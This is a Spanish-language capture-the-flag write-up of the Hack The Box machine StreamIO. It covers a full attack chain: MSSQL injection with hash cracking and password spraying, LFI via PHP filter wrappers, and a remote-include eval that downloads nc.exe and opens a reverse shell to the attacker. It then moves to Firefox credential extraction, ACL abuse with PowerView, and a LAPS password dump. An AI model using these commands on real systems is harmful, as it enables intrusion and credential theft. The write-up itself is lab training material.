# 10.10.11.158 - StreamIO
![StreamIO](https://user-images.githubusercontent.com/96772264/206920805-0b03ca2d-9fd5-4ad0-b505-e14527941d09.png)

-----------------------
# Part 1: Enumeración 

Puertos 53, 80, 88(kerberos), 135, 139, 389, 443(https), 445, 464, 593, 636, 5985(wirm).   
Nmap: ```nmap -sCV -T5 -p53,80,88,135,139,389,443,445,464,593,636,5985 -v 10.10.11.158```    
- Puerto 443: DNS:streamIO.htb, DNS:watch.streamIO.htb  
- Puerto RPC 135 -> Access denied ``` rpcclient -U "" 10.10.11.158 -N ```    

```console
└─$ crackmapexec smb 10.10.11.158
[*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
```
-------------------
## Puerto 88: Kerberos

```console
└─$ kerbrute userenum --dc 10.10.11.158 -d streamIO.htb /usr/share/seclists/Usernames/Names/names.txt
2022/12/09 13:56:15 >  [+] VALID USERNAME:	martin@streamIO.htb
└─$ /usr/bin/impacket-GetNPUsers streamIO.htb/ -no-pass -usersfile users.txt
[-] User martin doesn't have UF_DONT_REQUIRE_PREAUTH set
```
-------------------
## Puerto 53: dns

```console
└─$ dig @10.10.11.158 streamIO.htb mx
dc.streamIO.htb. hostmaster.streamIO.htb
└─$ dig @10.10.11.158 streamIO.htb axfr
; Transfer failed.
```
-------------------
## Puerto 80:

La página web es la IIS por defecto: 
![streamIO](https://user-images.githubusercontent.com/96772264/206920846-fd65496a-dd11-4883-8d10-69575e8c73f4.PNG)

```console
└─$ wfuzz -c --hc=404,400 -t 100 -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt http://streamIO.htb/FUZZ
000000021:   403        29 L     92 W       1233 Ch     "/aspnet_client/"
└─$ wfuzz -c --hc=404 -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  http://streamIO.htb/FUZZ
000006991:   400        80 L     276 W      3420 Ch     "*checkout*"
000015450:   400        80 L     276 W      3420 Ch     "*docroot*"
```

---------------------
## Puerto 443: https

![streamIO_2](https://user-images.githubusercontent.com/96772264/206920882-2d0926a0-6e41-4bbd-88eb-acc568c5d334.PNG)

- Hay un contact.php, pongo ```<script src="http://10.10.14.16"></script>``` pero no recibo respuesta.    
- En about.php salen tres personas "Barry" "Oliver" y "Samantha" pero al hacer lo de kerberos no resulta.    

Aun así el nombre de oliver sale abajo: oliver@Streamio.htb

```console
└─$ wfuzz -c --hc=404 -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  https://streamIO.htb/FUZZ/
000000003:   403        29 L     92 W       1233 Ch     "images"
000000246:   403        0 L      1 W        18 Ch       "admin"
000000537:   403        29 L     92 W       1233 Ch     "css"
000000940:   403        29 L     92 W       1233 Ch     "js"
000002758:   403        29 L     92 W       1233 Ch     "fonts"
000009792:   404        29 L     95 W       1245 Ch     "ShowForum"
```

En **/admin/** pone FORBIDDEN, el sisteam arrastra una PHPSESSID es decir una cookie de PHP, si consiguieramos la correcta podríamos entrar.
Hay una parte para registrarse y otra para entrar con las creds, pero aunque nos registremos no nos dejan.
![streamIO_4](https://user-images.githubusercontent.com/96772264/206920928-794bf481-e56a-4a70-b514-b2a78db76d3c.PNG)

------------------
## watch.streamIO.htb
Haciendo un ```whatweb https://watch.streamIO.htb``` nos sale que es PHP  

```console
└─$ wfuzz -c --hc=404 -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  https://watch.streamIO.htb/FUZZ/
000000256:   403        29 L     92 W       1233 Ch     "static"
└─$ wfuzz -c --hc=404 -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  https://watch.streamIO.htb/FUZZ.php
000000002:   200        78 L     245 W      2829 Ch     "index"
000000014:   200        7193 L   19558 W    253887 Ch   "search"
000019917:   200        19 L     47 W       677 Ch      "blocked"
```

**/search**
Si buscamos por una buena película:   
![streamIO_6](https://user-images.githubusercontent.com/96772264/206920938-240c34e5-89ec-4d42-9546-1689d05ee213.PNG)

-----------------------
# Part 2: MSSQLi

Ciertas palabras como "order" y "null" no las pilla: 
```asd' union select 1,2,3,4,5,6-- -``` -> 2 3  
```asd' union select 1,(SELECT DB_NAME()),3,4,5,6-- -``` -> STREAMIO  
```asd' union select 1,name,3,4,5,6 FROM master..sysdatabases-- -``` -> master, model, streamio...  
```asd' union select 1,name,id,4,5,6 FROM streamio..sysobjects-- -``` -> movies, users...  
```asd' union select 1,name,id,4,5,6 FROM syscolumns where id=901578250-- -``` password, username...  
```asd' union select 1,concat(username,':',password),3,4,5,6 FROM users-- -``` credenciales...  

Existe la tabla "streamio_backup" pero no nos deja acceder:   
```console
└─$ hashid 665a50ac9eaa781e4f7f04199db97a11
[+] MD2
[+] MD5 .. En john se llama Raw-MD5
└─$ john creds -w=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
highschoolmusical (Thane)   
physics69i       (Lenord)   
paddpadd         (admin)    
66boysandgirls.. (yoshihide)
%$clara          (Clara)    
$monique$1991$   (Bruno)    
$hadoW           (Barry)    
$3xybitch        (Juliette) 
##123a8j8w5123## (Lauren)   
!?Love?!123      (Michelle) 
!5psycho8!       (Victoria) 
!!sabrina$       (Sabrina)
```
Con todo esto se crea un archivo de credenciales:  
```console
└─$ hydra -L users.txt -P pass.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
[443][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..
[443][http-post-form] host: streamio.htb   login: Bruno   password: 66boysandgirls..
[443][http-post-form] host: streamio.htb   login: Barry   password: $3xybitch
[443][http-post-form] host: streamio.htb   login: Juliette   password: !!sabrina$
[443][http-post-form] host: streamio.htb   login: Michelle   password: 66boysandgirls..
[443][http-post-form] host: streamio.htb   login: Victoria   password: $3xybitch
[443][http-post-form] host: streamio.htb   login: Sabrina   password: !!sabrina$
```

Con las credenciales de esta persona se puede acceder al panel de admin de antes gracias que arrastramos la cookie privilegiada  "PHPSESSID"  
![streamIO_6](https://user-images.githubusercontent.com/96772264/206920959-2912cd42-9811-440a-9f10-0c0249f67574.PNG)

-----------------------
# Part 3: Explotación de PHPs

En el panel de admin hay varias pestañas que se traducen en parametro:   
```console
└─$ wfuzz -c --hc=404 --hh=1678 -t 100 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Cookie: PHPSESSID=38omuh6knr35pgjhtfvmi83tjd" 'https://streamIO.htb/admin/?FUZZ=test'
000000111:   200        74 L     187 W      2444 Ch     "user"
000000228:   200        398 L    916 W      12484 Ch    "staff"
000000999:   200        10790    25878 W    320235 Ch   "movie"
000005315:   200        49 L     137 W      1712 Ch     "debug"
```

Con el parámetro debug no se que hacer, probé a poner un comando como ```whoami```    
```https://streamio.htb/admin/?debug=\Windows\system32\drivers\etc\hosts``` -> su contenido  
```https://streamio.htb/admin/?debug=index.php``` -> error  

Con los php para que no se interpreten sino que se muestre se debe poner el wrapper de php de codificacion en base64:
```https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php```
Conseguimos el index.php

```php
<?php
define('included',true);

// Si el token de sesión no es el del admin nos dan el mensaje de forbidden
session_start();
if(!isset($_SESSION['admin'])) { header('HTTP/1.1 403 Forbidden'); die("<h1>FORBIDDEN</h1>"); }

// Se conecta a la database con estas creds:
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);

// La parte del LFI
if(isset($_GET['debug'])) 
{ echo 'this option is for developers only';
	if($_GET['debug'] === "index.php") {
		die(' ---- ERROR ----');
	} else { include $_GET['debug'];}}
	else if(isset($_GET['user'])) {require 'user_inc.php';}
	else if(isset($_GET['staff'])) {require 'staff_inc.php';}
	else if(isset($_GET['movie'])) {require 'movie_inc.php';}
?>
```
Miramos a ver si en **admin** hay algo más.  

```console
└─$ wfuzz -c --hc=404 --hh=1678 -t 100 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Cookie: PHPSESSID=mk7vtb65af847kjbpn5ospl9h9" 'https://streamIO.htb/admin/FUZZ.php'
000002394:   200        1 L      6 W        58 Ch       "master"
```
```https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php```

```php
<?php
if(isset($_POST['include']))
{ if($_POST['include'] !== "index.php" )
eval(file_get_contents($_POST['include']));
?>
```
Si pones ```https://streamio.htb/admin/master.php``` dice que solo se puede acceder desde "includes" es decir desde el debug de antes:
```console
└─$ curl -s -k -X POST -H "Cookie: PHPSESSID=mk7vtb65af847kjbpn5ospl9h9" \
'https://streamio.htb/admin/?debug=master.php' -d 'include=http://10.10.14.16/test';
```
En test pongo:
```system("certutil.exe -f -urlcache -split http://10.10.14.16/nc.exe C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe");```
```system("C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -e cmd 10.10.14.16 443");```

-----------------------
# Part 4: Dentro del sistema

Como antes no podíamos acceder a la base de datos de streamio..backup ahora a lo mejor si.
```console
C:\inetpub\streamio.htb\admin>sqlcmd -U db_admin -P B1@hx31234567890 -S localhost -d streamio_backup -Q "select * from users;"
id          username                                           password
----------- -------------------------------------------------- --------------------------------------------------
          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a
          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332
          3 James                                              c660060492d9edcaa8332d89c99c9239
          4 Theodore                                           925e5408ecb67aea449373d668b7359e
          5 Samantha                                           083ffae904143c4796e464dac33c1f7d
          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09
          7 William                                            d62be0dc82071bccc1322d64ec5b6c51
          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5
```
Crackeamos los hashes:  
```console
└─$ john hashes -w=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
get_dem_girls2@yahoo.com (?)
└─$ crackmapexec smb 10.10.11.158 -u users.txt -p "get_dem_girls2@yahoo.com"
SMB         10.10.11.158    445    DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com
└─$ evil-winrm -i 10.10.11.158 -u 'nikk37' -p 'get_dem_girls2@yahoo.com'
*Evil-WinRM* PS C:\Users\nikk37\Desktop> copy \\10.10.14.16\carpeta\enumeracion_windows.bat
```
En Appdata está la carpeta "Mozilla" que suele tener creds almacenadas bajo rutas muy específicas:  
```
*Evil-WinRM* PS C:\Users\nikk37\Desktop> download C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\logins.json logins.json
*Evil-WinRM* PS C:\Users\nikk37\Desktop> download C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db key4.db
```
Los hashes se rompen con [firepwd](https://github.com/lclevy/firepwd)

```console
└─$ git clone "https://github.com/lclevy/firepwd"
└─$ cd firepwd
└─$ pip install -r requirements.txt
└─$ cp ../key4.db .; cp ../logins.json .
└─$ python3 firepwd.py
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```
```console
└─$ crackmapexec smb 10.10.11.158 -u users.txt -p pass.txt --continue-on-succes;
SMB         10.10.11.158    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r
```

-----------------------
# Part 5: Escalando dentro del dominio

Para enumerar mejor el dominio, hay que utilizar la herramienta "bloodhound".  
```console
└─$ bloodhound-python -c All -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' -ns 10.10.11.158 -d streamio.htb -dc streamio.htb --zip
```
![streamIO_8](https://user-images.githubusercontent.com/96772264/206920980-e5d05f07-b32b-459b-aa78-afa5dd33c56c.PNG)

Nuestro usaurio tiene el privilegio "Read LAPS password". Primero hay que loeguearse como este usuario para estar en el grupo "Core Staff"  
```console
*Evil-WinRM* PS C:\Users\nikk37\Documents> $pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\nikk37\Documents> $cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)

*Evil-WinRM* PS C:\Users\nikk37\Documents> upload "/home/cucuxii/Maquinas/htb/StreamIO/PowerView.ps1"
*Evil-WinRM* PS C:\Users\nikk37\Documents> Import-Module .\PowerView.ps1

*Evil-WinRM* PS C:\Users\nikk37\Documents> Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "JDgodd"
*Evil-WinRM* PS C:\Users\nikk37\Documents> Add-DomainGroupMember -Identity "Core Staff" -Members "JDgodd" -Credential $cred
```
Con LDAPseach podremos dumpear la contraseña del Admin ya que estamos en un grupo que la puede leer. 
```console
└─$ ldapsearch -h 10.10.11.158 -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
ms-Mcs-AdmPwd: 9U8G&7IFcj9#gW
└─$ evil-winrm -i 10.10.11.158 -u 'Administrator' -p '9U8G&7IFcj9#gW'
```

